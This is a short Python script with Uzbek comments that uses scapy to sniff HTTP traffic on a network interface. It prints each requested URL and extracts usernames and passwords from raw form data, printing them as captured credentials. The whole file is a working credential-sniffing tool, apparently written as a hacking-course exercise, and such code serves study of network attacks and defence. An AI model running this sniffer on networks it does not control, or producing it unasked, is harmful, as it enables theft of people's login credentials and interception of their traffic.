import scapy.all as scapy
from scapy.layers import http
from colorama import Fore, Style

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface - interface 
    # store = False scapy packetlar xotira saqlanmasligi uchun
    # prn - paketlarni ushlab ularni taxlil qilish uchun
    
def get_credentials(packet):
    # Agar paketda raw ma'lumotlar bo'lsa, unda login va parollarni izlash
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors='ignore')  # Raw ma'lumotlarni dekodlash
        # Simple login va parolni topish uchun oddiy regex (masalan, form data yoki basic auth)
        if "username=" in load and "password=" in load:
            username = load.split("username=")[1].split("&")[0]  # usernameni ajratib olish
            password = load.split("password=")[1].split("&")[0]  # parolni ajratib olish
            return f"Login: {username} | Password: {password}"
    return None   

def get_url(packet):
    try:
        return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    except Exception:
        return "Unknown URL"
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # haslayer — paketning ma'lum bir protokoli yoki qatlamini tekshirish uchun ishlatiladigan metod. Masalan, IP, TCP, HTTP, Raw va hokazo.
        url = get_url(packet)
        print(f"{Fore.BLUE}[+] HTTP REQUEST >>> {url}{Style.RESET_ALL}")
       
        # Login va parollarni chiqarish
        credentials = get_credentials(packet)
        if credentials:                             
            print(f"{Fore.RED}[+] Login & Password >>> {credentials}{Style.RESET_ALL}")
        # Agar paketda raw ma'lumotlar bo'lsa ularni ham chiqarish    
        if packet.haslayer(scapy.Raw):
            try:
                print(packet[scapy.Raw].load)
            except UnicodeDecodeError :
                print("[Raw data is not printable]")
                
# "eth0" ni o'zgartirib, mos interfeysni tanlash mumkin
sniff("eth0")